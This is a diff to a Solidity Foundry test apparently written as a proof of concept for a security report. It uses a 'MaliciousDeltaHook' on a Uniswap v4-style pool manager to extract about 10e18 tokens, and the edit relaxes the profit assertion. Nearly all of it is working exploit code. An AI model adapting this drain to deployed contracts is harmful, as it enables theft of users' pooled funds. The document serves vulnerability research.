@@ -34,10 +34,8 @@ contract POC is Test {
         address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
         vm.etch(a, address(new MaliciousDeltaHook(address(manager))).code);
         hook=MaliciousDeltaHook(a);
-        token0.mint(address(this),100e18); 
-        token1.mint(address(this),100e18);
-        token0.mint(address(manager),100e18);
-        token1.mint(address(manager),100e18);
+        token0.mint(address(this),100e18); token1.mint(address(this),100e18);
+        token0.mint(address(manager),100e18); token1.mint(address(manager),100e18);
         key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
         hook.setCurrency1(Currency.wrap(address(token1)));
         hook.setAttacker(address(this));
@@ -54,19 +52,23 @@ contract POC is Test {
     }
 
     function unlockCallback(bytes calldata) external returns(bytes memory){
+        Currency c0 = Currency.wrap(address(token0));
+        Currency c1 = Currency.wrap(address(token1));
         if(isAddingLiquidity){
             (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
             (int128 amt0, int128 amt1) = _getDeltas(delta);
-            Currency c0 = Currency.wrap(address(token0));
-            Currency c1 = Currency.wrap(address(token1));
             if (amt0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-amt0)); manager.settle(); }
             if (amt1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-amt1)); manager.settle(); }
             if (amt0 > 0) manager.take(c0, address(this), uint128(amt0));
             if (amt1 > 0) manager.take(c1, address(this), uint128(amt1));
         } else {
-            manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            Currency c1 = Currency.wrap(address(token1));
-            manager.take(c1, address(this), 10e18);
+            (BalanceDelta sDelta,) = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
+            (int128 s0, int128 s1) = _getDeltas(sDelta);
+            // settle what WE owe, take what pool owes us (includes 10e18 exploit)
+            if (s0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-s0)); manager.settle(); }
+            if (s1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-s1)); manager.settle(); }
+            if (s0 > 0) manager.take(c0, address(this), uint128(s0));
+            if (s1 > 0) manager.take(c1, address(this), uint128(s1));
         }
         return "";
     }
@@ -79,6 +81,6 @@ contract POC is Test {
         console.log("Loss",bBefore-bAfter);
         console.log("Profit",profit);
         assertLt(bAfter,bBefore);
-        assertEq(profit,10e18);
+        assertGe(profit,10e18);
     }
 }
